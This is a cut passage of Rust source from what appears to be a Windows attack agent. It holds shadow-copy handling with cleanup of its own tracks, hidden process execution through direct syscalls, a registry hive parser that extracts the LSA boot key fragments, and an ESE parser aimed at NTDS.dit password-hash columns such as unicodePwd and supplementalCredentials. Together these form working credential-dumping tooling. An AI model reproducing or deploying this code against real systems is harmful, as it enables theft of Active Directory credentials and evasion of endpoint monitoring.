
        Ok(entries)
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// VssCleanup — Selective Shadow Copy Deletion
// ═══════════════════════════════════════════════════════════════════════════

/// Tracks agent-created shadow copies and provides selective cleanup.
pub struct VssCleanup {
    /// IDs of shadow copies created by the agent.
    created_ids: Vec<String>,
}

impl VssCleanup {
    /// Create a new cleanup tracker.
    pub fn new() -> Self {
        Self {
            created_ids: Vec::new(),
        }
    }

    /// Record that a shadow copy was created by the agent.
    pub fn track_created(&mut self, shadow: &ShadowCopy) {
        if !shadow.id.is_empty() {
            self.created_ids.push(shadow.id.clone());
        } else {
            // Track by index if no ID available.
            self.created_ids.push(format!("index:{}", shadow.index));
        }
    }

    /// Delete all shadow copies that were created by the agent.
    ///
    /// **IMPORTANT**: Only deletes copies in `created_ids`. Pre-existing
    /// system shadow copies (backups, restore points) are never touched.
    pub fn cleanup_all(&self) -> Result<()> {
        for id in &self.created_ids {
            if let Err(e) = self.delete_shadow_copy(id) {
                warn!("Failed to delete shadow copy {}: {}", id, e);
            }
        }
        Ok(())
    }

    /// Delete a single shadow copy by ID.
    ///
    /// Uses `vssadmin delete shadows /shadow=<id> /quiet`.
    fn delete_shadow_copy(&self, shadow_id: &str) -> Result<()> {
        // Check if this is an index-based ID (from device probe discovery).
        if shadow_id.starts_with("index:") {
            debug!(
                "Skipping index-based shadow copy cleanup (no GUID): {}",
                shadow_id
            );
            return Ok(());
        }

        let args = format!("delete shadows /shadow={} /quiet", shadow_id);
        let output = run_command_capture_output("vssadmin", &args)?;

        info!("Deleted shadow copy {}", shadow_id);

        // Check for error in output.
        if output.contains("Error") || output.contains("error") {
            bail!(
                "vssadmin delete reported error for {}: {}",
                shadow_id,
                output
            );
        }

        Ok(())
    }

    /// Get the number of tracked shadow copies.
    pub fn tracked_count(&self) -> usize {
        self.created_ids.len()
    }
}

impl Default for VssCleanup {
    fn default() -> Self {
        Self::new()
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Command Execution Helpers
// ═══════════════════════════════════════════════════════════════════════════

/// Result of a command execution.
struct CommandOutput {
    pub stdout: String,
    pub exit_code: u32,
}

/// Run a command and capture its stdout output.
///
/// Uses CreateProcessW with redirected stdout via anonymous pipes.
/// The command runs with `CREATE_NO_WINDOW` to avoid console flashes.
fn run_command_capture_output(program: &str, args: &str) -> Result<String> {
    let api = Api::resolve()?;

    // Build the full command line: "program args"
    let cmd_line = format!("{} {}", program, args);
    let mut cmd_line_wide: Vec<u16> = OsStr::new(&cmd_line)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    // Create pipes for stdout capture.
    let mut sa = winapi::um::minwinbase::SECURITY_ATTRIBUTES {
        nLength: std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as u32,
        lpSecurityDescriptor: ptr::null_mut(),
        bInheritHandle: TRUE,
    };

    let mut stdout_read: HANDLE = ptr::null_mut();
    let mut stdout_write: HANDLE = ptr::null_mut();

    if unsafe {
        (api.create_pipe)(
            &mut stdout_read,
            &mut stdout_write,
            &mut sa,
            READ_BUFFER_SIZE as DWORD,
        )
    } == FALSE
    {
        bail!(
            "CreatePipe failed: {}",
            unsafe { (api.get_last_error)() }
        );
    }

    // Make the read handle non-inheritable using NtSetInformationObject.
    // OBJECT_HANDLE_FLAG_INFORMATION { Inherit, ProtectFromClose } = two BOOLs.
    let mut handle_flags: [u32; 2] = [0, 0]; // Inherit=FALSE, ProtectFromClose=FALSE
    let _ = crate::syscall!(
        "NtSetInformationObject",
        stdout_read as u64,
        4u64, // ObjectHandleFlagInformation
        handle_flags.as_mut_ptr() as u64,
        8u64, // size of two BOOLs
    );

    let mut startup_info = STARTUPINFOW::default();
    startup_info.dw_flags = STARTF_USESTDHANDLES;
    startup_info.h_std_input = ptr::null_mut();
    startup_info.h_std_output = stdout_write;
    startup_info.h_std_error = stdout_write;

    let mut proc_info = PROCESS_INFORMATION::default();

    let created = unsafe {
        (api.create_process_w)(
            ptr::null_mut(), // Use command line instead
            cmd_line_wide.as_mut_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            TRUE,
            CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut startup_info,
            &mut proc_info,
        )
    };

    // Close the write end of the pipe (child has inherited it).
    unsafe { (api.close_handle)(stdout_write) };

    if created == FALSE {
        unsafe { (api.close_handle)(stdout_read) };
        bail!("CreateProcessW failed for {} {}: {}", program, args, unsafe {
            (api.get_last_error)()
        });
    }

    // Close thread handle immediately.
    let _ = crate::syscall!("NtClose", proc_info.h_thread as u64);

    // Read all output from the pipe.
    let mut output = Vec::new();
    let mut buf = [0u8; READ_BUFFER_SIZE];
    loop {
        let mut bytes_read: DWORD = 0;
        let read = unsafe {
            crate::syscall!(
                "NtReadFile",
                stdout_read as u64,
                0u64,
                0u64,
                0u64,
                &mut bytes_read as *mut DWORD as *mut u64 as u64,
                buf.as_mut_ptr() as u64,
                buf.len() as u64,
                0u64,
                0u64,
            )
        };
        if let Ok(status) = read {
            if status < 0 || bytes_read == 0 {
                break;
            }
            output.extend_from_slice(&buf[..bytes_read as usize]);
        } else {
            break;
        }
    }

    // Close the read handle.
    unsafe { (api.close_handle)(stdout_read) };

    // Wait for process to finish.
    unsafe {
        (api.wait_for_single_object)(proc_info.h_process, INFINITE);
    }

    let mut exit_code: DWORD = 0;
    unsafe {
        (api.get_exit_code_process)(proc_info.h_process, &mut exit_code);
    }

    // Close process handle.
    let _ = crate::syscall!("NtClose", proc_info.h_process as u64);

    let stdout_str = String::from_utf8_lossy(&output).to_string();

    if exit_code != 0 {
        debug!(
            "Command {} {} exited with code {}",
            program, args, exit_code
        );
    }

    Ok(stdout_str)
}

// ═══════════════════════════════════════════════════════════════════════════
// Parsing Utilities
// ═══════════════════════════════════════════════════════════════════════════

/// Parse vssadmin output to extract shadow copy metadata.
fn parse_vssadmin_output(output: &str) -> Result<Vec<ShadowCopy>> {
    let mut copies = Vec::new();
    let mut current = ShadowCopyBuilder::new();

    for line in output.lines() {
        let line = line.trim();

        if line.starts_with("Contents of shadow copy set ID:") {
            // Start of a new entry — flush previous.
            if let Some(sc) = current.build() {
                copies.push(sc);
            }
            current = ShadowCopyBuilder::new();
        } else if let Some(rest) = line.strip_prefix("Shadow Copy ID:") {
            current.id = rest.trim().trim_matches('{').trim_matches('}').to_string();
        } else if let Some(rest) = line.strip_prefix("Shadow Copy Volume:") {
            current.device_object = rest.trim().to_string();
        } else if let Some(rest) = line.strip_prefix("Original Volume:") {
            current.volume_name = rest.trim().to_string();
        } else if let Some(rest) = line.strip_prefix("Shadow Copy Creation Time:") {
            current.install_date = rest.trim().to_string();
        }
    }

    // Flush the last entry.
    if let Some(sc) = current.build() {
        copies.push(sc);
    }

    Ok(copies)
}

/// Builder for ShadowCopy during parsing.
struct ShadowCopyBuilder {
    id: String,
    device_object: String,
    volume_name: String,
    install_date: String,
}

impl ShadowCopyBuilder {
    fn new() -> Self {
        Self {
            id: String::new(),
            device_object: String::new(),
            volume_name: String::new(),
            install_date: String::new(),
        }
    }

    fn build(self) -> Option<ShadowCopy> {
        if self.device_object.is_empty() {
            return None;
        }
        let index = parse_shadow_index(&self.device_object)?;
        Some(ShadowCopy {
            device_object: self.device_object,
            id: self.id,
            volume_name: self.volume_name,
            install_date: self.install_date,
            index,
        })
    }
}

/// Extract the numeric index from a VSS device path.
fn parse_shadow_index(device_path: &str) -> Option<u32> {
    // Extract number from "...HarddiskVolumeShadowCopyNN"
    let path = device_path.trim_end_matches('\\');
    let idx = path.rfind("ShadowCopy")?;
    let num_str = &path[idx + "ShadowCopy".len()..];
    num_str.parse().ok()
}

// ═══════════════════════════════════════════════════════════════════════════
// Registry Hive Parser (Minimal Implementation for Boot Key Extraction)
// ═══════════════════════════════════════════════════════════════════════════

/// Minimal registry hive parser for extracting keys from binary hive data.
///
/// Supports navigating the hive structure to find specific key paths and
/// extracting value data and class names. This is NOT a full registry parser —
/// it only implements the subset needed for VSS credential extraction.
struct RegistryHive<'a> {
    data: &'a [u8],
    root_offset: u32,
}

impl<'a> RegistryHive<'a> {
    /// Parse a registry hive from raw bytes.
    fn parse(data: &'a [u8]) -> Result<Self> {
        if data.len() < 4096 {
            bail!("Registry hive data too small");
        }
        // Validate hive signature: "regf" at offset 0.
        if &data[0..4] != b"regf" {
            bail!("Invalid registry hive signature");
        }

        // Root cell offset is at offset 0x24 (relative to hive bins data start at 0x1000).
        let root_cell_offset = read_u32_le(&data[0x24..0x28]);

        Ok(Self {
            data,
            root_offset: root_cell_offset,
        })
    }

    /// Get the CurrentControlSet name (e.g., "ControlSet001").
    fn current_control_set(&self) -> Result<String> {
        // The Select key has a "Current" value indicating which ControlSet is active.
        let select = self.navigate(r"SYSTEM\Select")?;
        let current_val = select.get_value_u32("Current")?;
        Ok(format!("ControlSet{:03}", current_val))
    }

    /// Navigate to a key path within the hive.
    fn navigate(&self, path: &str) -> Result<RegistryKey<'a>> {
        let parts: Vec<&str> = path.split('\\').filter(|s| !s.is_empty()).collect();
        if parts.is_empty() {
            bail!("Empty registry path");
        }

        let mut current_offset = self.root_offset;

        // Navigate through the path components.
        for part in &parts {
            let key = RegistryKey {
                data: self.data,
                cell_offset: current_offset,
            };

            current_offset = key
                .find_subkey(part)
                .ok_or_else(|| anyhow!("Subkey not found: {}", part))?;
        }

        Ok(RegistryKey {
            data: self.data,
            cell_offset: current_offset,
        })
    }
}

/// A registry key within a hive.
struct RegistryKey<'a> {
    data: &'a [u8],
    cell_offset: u32,
}

impl<'a> RegistryKey<'a> {
    /// Find a subkey by name.
    fn find_subkey(&self, name: &str) -> Option<u32> {
        let cell_abs = 0x1000 + self.cell_offset as usize;
        if cell_abs + 0x50 > self.data.len() {
            return None;
        }

        // Key node signature: "nk" at offset +4.
        if &self.data[cell_abs + 4..cell_abs + 6] != b"nk" {
            return None;
        }

        // Number of subkeys at offset +0x1C (relative to cell start, not signature).
        let num_subkeys = read_u32_le(&self.data[cell_abs + 0x1C..cell_abs + 0x20]) as usize;
        if num_subkeys == 0 {
            return None;
        }

        // Subkey list offset at +0x20.
        let sk_list_offset = read_u32_le(&self.data[cell_abs + 0x20..cell_abs + 0x24]) as usize;
        let sk_list_abs = 0x1000 + sk_list_offset;

        if sk_list_abs + 8 > self.data.len() {
            return None;
        }

        // Determine list type from signature.
        let sig = &self.data[sk_list_abs + 4..sk_list_abs + 6];

        match sig {
            b"lf" | b"lh" => {
                // Hash leaf: num_entries at +6, then entries of (offset: u32, hash: u32).
                let num_entries =
                    read_u32_le(&self.data[sk_list_abs + 6..sk_list_abs + 10]) as usize;
                let entries_start = sk_list_abs + 10;
                let entry_size = 8; // offset + hash

                for i in 0..num_entries {
                    let entry_off = entries_start + i * entry_size;
                    if entry_off + 8 > self.data.len() {
                        break;
                    }

                    let subkey_offset =
                        read_u32_le(&self.data[entry_off..entry_off + 4]) as usize;
                    let subkey_abs = 0x1000 + subkey_offset;

                    if subkey_abs + 0x50 > self.data.len() {
                        continue;
                    }

                    // Check key name.
                    let name_len =
                        read_u16_le(&self.data[subkey_abs + 0x48..subkey_abs + 0x4A]) as usize;
                    let name_offset = subkey_abs + 0x4C;

                    if name_offset + name_len > self.data.len() {
                        continue;
                    }

                    let key_name =
                        String::from_utf8_lossy(&self.data[name_offset..name_offset + name_len]);

                    if key_name.eq_ignore_ascii_case(name) {
                        return Some(subkey_offset as u32);
                    }
                }
            }
            b"ri" => {
                // Index root: contains sub-lists.
                let num_entries =
                    read_u32_le(&self.data[sk_list_abs + 6..sk_list_abs + 10]) as usize;
                let entries_start = sk_list_abs + 10;

                for i in 0..num_entries {
                    let entry_off = entries_start + i * 4;
                    if entry_off + 4 > self.data.len() {
                        break;
                    }

                    let sub_list_offset =
                        read_u32_le(&self.data[entry_off..entry_off + 4]) as usize;

                    // Recursively check the sub-list.
                    // For simplicity, just navigate into the sub-list.
                    if let Some(found) = self.find_in_list(sub_list_offset, name) {
                        return Some(found);
                    }
                }
            }
            _ => {
                // Unknown list type — try linear scan.
                let num_entries =
                    read_u32_le(&self.data[sk_list_abs + 6..sk_list_abs + 10]) as usize;
                let entries_start = sk_list_abs + 10;
                let entry_size = 8;

                for i in 0..num_entries {
                    let entry_off = entries_start + i * entry_size;
                    if entry_off + 8 > self.data.len() {
                        break;
                    }

                    let subkey_offset =
                        read_u32_le(&self.data[entry_off..entry_off + 4]) as usize;
                    let subkey_abs = 0x1000 + subkey_offset;

                    if subkey_abs + 0x50 > self.data.len() {
                        continue;
                    }

                    let name_len =
                        read_u16_le(&self.data[subkey_abs + 0x48..subkey_abs + 0x4A]) as usize;
                    let name_offset = subkey_abs + 0x4C;

                    if name_offset + name_len > self.data.len() {
                        continue;
                    }

                    let key_name =
                        String::from_utf8_lossy(&self.data[name_offset..name_offset + name_len]);

                    if key_name.eq_ignore_ascii_case(name) {
                        return Some(subkey_offset as u32);
                    }
                }
            }
        }

        None
    }

    /// Helper: search a subkey list for a name.
    fn find_in_list(&self, list_offset: usize, name: &str) -> Option<u32> {
        let list_abs = 0x1000 + list_offset;
        if list_abs + 10 > self.data.len() {
            return None;
        }

        let num_entries = read_u32_le(&self.data[list_abs + 6..list_abs + 10]) as usize;
        let entry_size = 8;
        let entries_start = list_abs + 10;

        for i in 0..num_entries {
            let entry_off = entries_start + i * entry_size;
            if entry_off + 8 > self.data.len() {
                break;
            }

            let subkey_offset = read_u32_le(&self.data[entry_off..entry_off + 4]) as usize;
            let subkey_abs = 0x1000 + subkey_offset;

            if subkey_abs + 0x50 > self.data.len() {
                continue;
            }

            let name_len = read_u16_le(&self.data[subkey_abs + 0x48..subkey_abs + 0x4A]) as usize;
            let name_start = subkey_abs + 0x4C;

            if name_start + name_len > self.data.len() {
                continue;
            }

            let key_name = String::from_utf8_lossy(&self.data[name_start..name_start + name_len]);

            if key_name.eq_ignore_ascii_case(name) {
                return Some(subkey_offset as u32);
            }
        }

        None
    }

    /// Get a value's data as raw bytes.
    fn get_value_bytes(&self, value_name: &str) -> Result<Vec<u8>> {
        let cell_abs = 0x1000 + self.cell_offset as usize;
        if cell_abs + 0x30 > self.data.len() {
            bail!("Key cell out of bounds");
        }

        // Value list offset at +0x28.
        let vl_offset = read_u32_le(&self.data[cell_abs + 0x28..cell_abs + 0x2C]) as usize;
        let vl_abs = 0x1000 + vl_offset;

        if vl_abs + 4 > self.data.len() {
            bail!("Value list out of bounds");
        }

        // Number of values at key node +0x24.
        let num_values = read_u32_le(&self.data[cell_abs + 0x24..cell_abs + 0x28]) as usize;

        // Value list is an array of u32 offsets.
        for i in 0..num_values {
            let ventry_off = vl_abs + i * 4;
            if ventry_off + 4 > self.data.len() {
                break;
            }

            let value_offset = read_u32_le(&self.data[ventry_off..ventry_off + 4]) as usize;
            let value_abs = 0x1000 + value_offset;

            if value_abs + 0x18 > self.data.len() {
                continue;
            }

            // Value node signature: "vk" at +4.
            if &self.data[value_abs + 4..value_abs + 6] != b"vk" {
                continue;
            }

            // Name length at +0x10, name at +0x18.
            let vname_len = read_u16_le(&self.data[value_abs + 0x10..value_abs + 0x12]) as usize;
            let vname_start = value_abs + 0x18;

            if vname_len == 0 {
                // Default value.
                if value_name.is_empty() {
                    return self.extract_value_data(value_abs);
                }
                continue;
            }

            if vname_start + vname_len > self.data.len() {
                continue;
            }

            let vname =
                String::from_utf8_lossy(&self.data[vname_start..vname_start + vname_len]);

            if vname.eq_ignore_ascii_case(value_name) {
                return self.extract_value_data(value_abs);
            }
        }

        bail!("Value not found: {}", value_name)
    }

    /// Extract the data from a value node.
    fn extract_value_data(&self, value_abs: usize) -> Result<Vec<u8>> {
        if value_abs + 0x18 > self.data.len() {
            bail!("Value node out of bounds");
        }

        // Data size at +0x08. If bit 31 is set, data is stored inline (low 31 bits = size).
        let data_size_raw = read_u32_le(&self.data[value_abs + 0x08..value_abs + 0x0C]);
        let data_offset_field = read_u32_le(&self.data[value_abs + 0x0C..value_abs + 0x10]);

        if data_size_raw & 0x80000000 != 0 {
            // Data stored inline in the offset field (up to 4 bytes).
            let inline_size = (data_size_raw & 0x7FFFFFFF) as usize;
            let mut data = vec![0u8; inline_size];
            let src_start = value_abs + 0x0C;
            let copy_len = inline_size.min(4);
            if src_start + copy_len <= self.data.len() {
                data[..copy_len].copy_from_slice(&self.data[src_start..src_start + copy_len]);
            }
            Ok(data)
        } else {
            // Data stored externally.
            let data_size = data_size_raw as usize;
            let data_abs = 0x1000 + data_offset_field as usize;

            if data_abs + data_size > self.data.len() {
                bail!(
                    "Value data out of bounds: abs={}, size={}, len={}",
                    data_abs,
                    data_size,
                    self.data.len()
                );
            }

            Ok(self.data[data_abs..data_abs + data_size].to_vec())
        }
    }

    /// Get a value as u32.
    fn get_value_u32(&self, value_name: &str) -> Result<u32> {
        let data = self.get_value_bytes(value_name)?;
        if data.len() < 4 {
            bail!("Value too short for u32");
        }
        Ok(read_u32_le(&data[..4]))
    }

    /// Get a key's class name as raw bytes (used for boot key extraction).
    ///
    /// The LSA key fragments (JD, Skew1, GBG, Data) store their data
    /// in the class name field of the registry key, not as values.
    fn get_class_bytes(&self, key_name: &str) -> Result<Vec<u8>> {
        let subkey_offset = self
            .find_subkey(key_name)
            .ok_or_else(|| anyhow!("Subkey not found: {}", key_name))?;

        let subkey_abs = 0x1000 + subkey_offset as usize;
        if subkey_abs + 0x50 > self.data.len() {
            bail!("Subkey cell out of bounds");
        }

        // Class name length at +0x44 (in bytes).
        let class_len = read_u16_le(&self.data[subkey_abs + 0x44..subkey_abs + 0x46]) as usize;
        // Class name offset at +0x40.
        let class_offset = read_u32_le(&self.data[subkey_abs + 0x40..subkey_abs + 0x44]) as usize;

        if class_len == 0 {
            bail!("No class name for key {}", key_name);
        }

        let class_abs = 0x1000 + class_offset;

        if class_abs + class_len > self.data.len() {
            bail!(
                "Class data out of bounds: abs={}, len={}",
                class_abs,
                class_len
            );
        }

        // The class name is stored as UTF-16LE. We need the raw bytes.
        // The LSA key fragments are actually hex-encoded UTF-16 strings.
        // Decode the UTF-16 class name to get the hex string, then convert to bytes.
        let class_utf16: Vec<u16> = (0..class_len / 2)
            .map(|i| {
                read_u16_le(
                    &self.data[class_abs + i * 2..class_abs + i * 2 + 2],
                )
            })
            .collect();

        let hex_str = String::from_utf16_lossy(&class_utf16);
        hex_decode(&hex_str)
    }

    /// Enumerate subkey names.
    fn enumerate_subkeys(&self) -> Vec<String> {
        let cell_abs = 0x1000 + self.cell_offset as usize;
        let mut names = Vec::new();

        if cell_abs + 0x50 > self.data.len() {
            return names;
        }

        // Number of subkeys at +0x1C.
        let num_subkeys = read_u32_le(&self.data[cell_abs + 0x1C..cell_abs + 0x20]) as usize;
        if num_subkeys == 0 {
            return names;
        }

        // Subkey list offset at +0x20.
        let sk_list_offset = read_u32_le(&self.data[cell_abs + 0x20..cell_abs + 0x24]) as usize;
        let sk_list_abs = 0x1000 + sk_list_offset;

        if sk_list_abs + 10 > self.data.len() {
            return names;
        }

        let num_entries = read_u32_le(&self.data[sk_list_abs + 6..sk_list_abs + 10]) as usize;
        let entry_size = 8;
        let entries_start = sk_list_abs + 10;

        for i in 0..num_entries {
            let entry_off = entries_start + i * entry_size;
            if entry_off + 8 > self.data.len() {
                break;
            }

            let subkey_offset = read_u32_le(&self.data[entry_off..entry_off + 4]) as usize;
            let subkey_abs = 0x1000 + subkey_offset;

            if subkey_abs + 0x50 > self.data.len() {
                continue;
            }

            let name_len = read_u16_le(&self.data[subkey_abs + 0x48..subkey_abs + 0x4A]) as usize;
            let name_start = subkey_abs + 0x4C;

            if name_start + name_len > self.data.len() {
                continue;
            }

            names.push(String::from_utf8_lossy(&self.data[name_start..name_start + name_len]).to_string());
        }

        names
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// ESE Database Parser (for NTDS.dit)
// ═══════════════════════════════════════════════════════════════════════════

/// ESE database parser for NTDS.dit credential extraction.
///
/// Properly parses the Extensible Storage Engine (JET Blue) database format:
/// - Reads the database header to determine page size
/// - Walks all pages in the database
/// - For each page, parses the page header and node array (tag array)
/// - For leaf data nodes, parses tagged columns using the ESE tagged-column
///   TLV encoding
/// - Filters for records that contain user account data (sAMAccountType)
///
/// The ESE page layout:
/// ```text
///   [Page Header (0x40 bytes on modern ESE)]
///   [Node data area — grows backward from end of page]
///   [... free space ...]
///   [Tag array — grows forward from after header]
///     tag[0]: offset(2) + cb(2) for first node
///     tag[1]: offset(2) + cb(2) for second node
///     ...
/// ```
///
/// Each tag entry points to a node within the page.  A leaf data node
/// contains:
/// ```text
///   [Common node header: 8 bytes] — timestamp(4) + xnBaseline(4)
///   [Tagged column array header: variable]
///   [Tagged column instances]
/// ```
struct EseDatabase<'a> {
    data: &'a [u8],
    page_size: usize,
}

/// A table within an ESE database.
struct EseTable<'a> {
    name: String,
    data: &'a [u8],
}

/// A row within an ESE table.
struct EseRow<'a> {
    columns: Vec<(u32, &'a [u8])>,
}

/// ESE page header size (64 bytes on modern ESE, 40 bytes on legacy).
const ESE_PAGE_HEADER_SIZE: usize = 0x40;

/// ESE page flag: leaf page.
const ESE_PGFLAGS_LEAF: u16 = 0x0004;

/// ESE node flag: the node contains tagged columns.
const ESE_NODEFLAG_TAGGED: u8 = 0x04;

impl<'a> EseDatabase<'a> {
    /// Parse an ESE database from raw bytes.
    ///
    /// Reads the database header to determine the page size, then scans
    /// all pages for the "datatable" B-tree leaf pages.
    fn parse(data: &'a [u8]) -> Result<Self> {
        if data.len() < 0x200 {
            bail!("ESE database data too small");
        }

        // ESE database header: the checksum at offset 0 is a 4-byte magic.
        // The page size is at offset 0x08 (4 bytes, little-endian).
        // Common page sizes: 2048 (0x800), 4096 (0x1000), 8192 (0x2000),
        // 16384 (0x4000), 32768 (0x8000).
        let page_size = read_u32_le(&data[0x08..0x0C]) as usize;
        let page_size = match page_size {
            0x800 | 0x1000 | 0x2000 | 0x4000 | 0x8000 => page_size,
            _ => {
                // Default to 32 KiB for modern ESE (Windows Server 2008+).
                debug!(
                    "ESE page size {} is unexpected, defaulting to 32 KiB",
                    page_size
                );
                0x8000
            }
        };

        debug!("ESE database: {} bytes, page size {}", data.len(), page_size);

        Ok(Self { data, page_size })
    }

    /// Scan all pages in the database for rows matching user account records.
    ///
    /// Instead of building a full B-tree traversal (which would require
    /// parsing the catalog table to find root pages), we scan every page
    /// in the database looking for leaf data pages that contain our target
    /// tagged columns.  This is slower but simpler and more robust against
    /// ESE version differences.
    fn scan_all_rows(&self) -> Vec<EseRow<'a>> {
        let mut rows = Vec::new();
        let num_pages = self.data.len() / self.page_size;

        for page_idx in 0..num_pages {
            let page_start = page_idx * self.page_size;
            let page_end = page_start + self.page_size;
            if page_end > self.data.len() {
                break;
            }
            let page = &self.data[page_start..page_end];

            if let Some(page_rows) = self.parse_page(page) {
                rows.extend(page_rows);
            }
        }

        rows
    }

    /// Parse a single ESE page and extract rows from leaf data nodes.
    fn parse_page(&self, page: &'a [u8]) -> Option<Vec<EseRow<'a>>> {
        if page.len() < ESE_PAGE_HEADER_SIZE + 4 {
            return None;
        }

        // Page header fields (offsets relative to page start):
        //   0x00: checksum (4 bytes)
        //   0x04: page signature EC (2 bytes: 0x00EC for data pages in LE)
        //   0x06: previous page (4 bytes)
        //   0x0A: next page (4 bytes)
        //   0x0E: father page / Owning LDP (4 bytes)
        //   0x12: available page size (2 bytes, for legacy 40-byte header)
        //   0x14: available data size (2 bytes, extended header)
        //   0x1C: flags (2 bytes) — bit 2 = leaf
        //   0x3E: number of tags/nodes (2 bytes, LE)

        // Read number of tags (nodes) on this page.
        let num_tags = read_u16_le(&page[0x3E..0x40]) as usize;

        if num_tags == 0 || num_tags > 0x1000 {
            return None;
        }

        // Check if this is a leaf page. Not all ESE versions set this
        // reliably, so we use it as a hint but don't require it.
        let _page_flags = read_u16_le(&page[0x1C..0x1E]);

        // The tag array starts immediately after the page header.
        // Each tag entry is 4 bytes: offset (2 bytes LE) + cb (2 bytes LE).
        // The offset is measured from the start of the page.
        // cb includes the node header bytes.
        let tag_array_start = ESE_PAGE_HEADER_SIZE;
        let mut rows = Vec::new();

        for tag_idx in 0..num_tags {
            let tag_entry_off = tag_array_start + tag_idx * 4;
            if tag_entry_off + 4 > page.len() {
                break;
            }

            let node_offset = read_u16_le(&page[tag_entry_off..tag_entry_off + 2]) as usize;
            let node_cb = read_u16_le(&page[tag_entry_off + 2..tag_entry_off + 4]) as usize;

            // Validate node bounds.
            if node_cb < 8 || node_offset + node_cb > page.len() {
                continue;
            }

            let node_data = &page[node_offset..node_offset + node_cb];

            // Try to parse tagged columns from this node.
            if let Some(row) = self.parse_node_tagged_columns(node_data) {
                // Only include rows that have at least one of our target columns.
                if !row.columns.is_empty() {
                    rows.push(row);
                }
            }
        }

        if rows.is_empty() {
            None
        } else {
            Some(rows)
        }
    }

    /// Parse tagged columns from a node's data area.
    ///
    /// ESE tagged column encoding (after the common node header):
    ///
    /// The node starts with an 8-byte common header (timestamp + baseline).
    /// For tagged nodes, what follows is the tagged column data:
    ///
    /// ```text
    ///   [tagged_inline_header (optional, variable)]
    ///   [tagged column instances, one after another]
    /// ```
    ///
    /// Each tagged column instance is encoded as:
    /// ```text
    ///   [column_id (variable-length, 1-4 bytes)]
    ///   [data_length (variable-length, 1-4 bytes)]
    ///   [data bytes]
    /// ```
    ///
    /// The column_id uses a variable-length encoding where the high bits
    /// of the first byte indicate continuation:
    ///   - 0x00-0x7F: 1-byte column id (low 7 bits)
    ///   - 0x80-0xBF: 2-byte column id (14 bits)
    ///   - 0xC0-0xDF: 3-byte column id (21 bits)
    ///   - 0xE0-0xFF: 4-byte column id (29 bits)
    ///
    /// However, in practice NTDS.dit uses the JET_coltyp tagged format
    /// where each tagged column instance has:
    ///   - info byte (1 byte): flags + data location info
    ///   - column identifier (variable, see above)
    ///   - data length (variable, same encoding)
    ///   - data bytes
    ///
    /// We scan the node body looking for our known ATTm column identifiers
    /// encoded as 3-byte or 4-byte values and extract the subsequent data.
    fn parse_node_tagged_columns(&self, node_data: &'a [u8]) -> Option<EseRow<'a>> {
        // Skip the 8-byte common node header.
        if node_data.len() < 8 {
            return None;
        }

        let body = &node_data[8..];
        let mut columns: Vec<(u32, &'a [u8])> = Vec::new();
        let mut pos = 0;

        // Target ATTm column identifiers (NTDS.dit datatable columns).
        // These are well-known column tags used by the Active Directory
        // database schema for user credential data.
        const COL_SAM_ACCOUNT_TYPE: u32 = 0x589983;
        const COL_DISTINGUISHED_NAME: u32 = 0x589922;
        const COL_UNICODE_PWD: u32 = 0x590045;
        const COL_SUPPLEMENTAL_CRED: u32 = 0x59046A;
        const COL_OBJECT_SID: u32 = 0x589835;
        const COL_SAM_ACCOUNT_NAME: u32 = 0x59019D;
        const COL_USER_PRINCIPAL_NAME: u32 = 0x589918;

        // Known 3-byte LE prefixes for our target columns.
        let target_tags: &[(u32, [u8; 3])] = &[
            (COL_SAM_ACCOUNT_TYPE, [0x83, 0x99, 0x58]),
            (COL_DISTINGUISHED_NAME, [0x22, 0x99, 0x58]),
            (COL_UNICODE_PWD, [0x45, 0x00, 0x59]),
            (COL_SUPPLEMENTAL_CRED, [0x6A, 0x04, 0x59]),
            (COL_OBJECT_SID, [0x35, 0x98, 0x58]),
            (COL_SAM_ACCOUNT_NAME, [0x9D, 0x01, 0x59]),
            (COL_USER_PRINCIPAL_NAME, [0x18, 0x99, 0x58]),
        ];

        // Scan the node body for tagged column instances.
        // Each tagged column instance starts with an info/flags byte,
        // then the column ID, then the data length, then the data.
        //
        // We look for our target column IDs in the byte stream and then
        // try to parse the length that follows to extract exactly the
        // right amount of data.
        while pos + 4 < body.len() {
            let mut found = false;

            for &(tag_id, ref tag_bytes) in target_tags {
                if body[pos..].starts_with(tag_bytes) {
                    // Found a target column tag at position pos.
                    // The 3 tag bytes encode the column ID.
                    // After the tag, there may be a continuation byte or
                    // a length indicator.  The actual data layout varies,
                    // but typically:
                    //   [tag 3 bytes] [length_info] [data...]
                    //
                    // For a more robust parse, try to read a length byte
                    // right after the tag and then read that many bytes
                    // of data.

                    let data_offset = pos + 3;

                    // Try to parse a variable-length data size.
                    // ESE uses a 7-bit continuation encoding for lengths:
                    //   bit 7 clear: single-byte length (bits 0-6)
                    //   bit 7 set: multi-byte, continue reading
                    let (data_len, header_consumed) =
                        Self::read_ese_var_length(&body[data_offset..]);

                    let content_start = data_offset + header_consumed;
                    if content_start + data_len <= body.len() && data_len > 0 {
                        columns.push((tag_id, &body[content_start..content_start + data_len]));
                        pos = content_start + data_len;
                    } else {
                        // Length parse failed or data extends past node —
                        // use a bounded heuristic scan.
                        let max_scan = body.len().saturating_sub(data_offset).min(512);
                        let mut end = 3;
                        while end < max_scan {
                            // Check if we've hit another known tag.
                            let mut hit_tag = false;
                            for &(_, ref other_bytes) in target_tags {
                                if data_offset + end + 3 <= body.len()
                                    && body[data_offset + end..].starts_with(other_bytes)
                                {
                                    hit_tag = true;
                                    break;
                                }
                            }
                            if hit_tag {
                                break;
                            }
                            end += 1;
                        }
                        if end > 3 {
                            columns.push((tag_id, &body[data_offset + 3..data_offset + end]));
                        }
                        pos = data_offset + end;
                    }
                    found = true;
                    break;
                }
            }

            if !found {
                pos += 1;
            }
        }

        if columns.is_empty() {
            None
        } else {
            Some(EseRow { columns })
        }
    }

    /// Read a variable-length integer from ESE tagged column data.
    ///
    /// ESE uses a 7-bit continuation encoding:
    /// - If bit 7 is clear: single byte, value = bits 0-6
    /// - If bit 7 is set: continue reading, accumulate 7 bits per byte
    ///
    /// Returns (value, bytes_consumed).
    fn read_ese_var_length(data: &[u8]) -> (usize, usize) {
        if data.is_empty() {
            return (0, 0);
        }

